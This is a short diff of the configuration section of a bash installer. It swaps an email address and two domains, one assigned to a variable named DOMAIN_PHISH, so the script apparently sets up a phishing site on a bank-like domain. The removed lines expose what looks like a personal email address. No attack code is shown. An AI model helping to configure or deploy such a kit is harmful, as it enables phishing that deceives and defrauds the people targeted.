@@ -8,9 +8,9 @@ set -e
 INSTALL_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 
 # Конфигурация — измените под свой домен и email
-EMAIL="dmitriyvisotskiydr15061991@gmail.com"
-DOMAIN_ADMIN="admin.vtb.news"
-DOMAIN_PHISH="helpdesk.vtb.news"
+EMAIL="dm1111@gmail.com"
+DOMAIN_ADMIN="admin.max.news"
+DOMAIN_PHISH="helpdesk.max.news"
 
 # Цветной вывод
 RED='\033[0;31m'
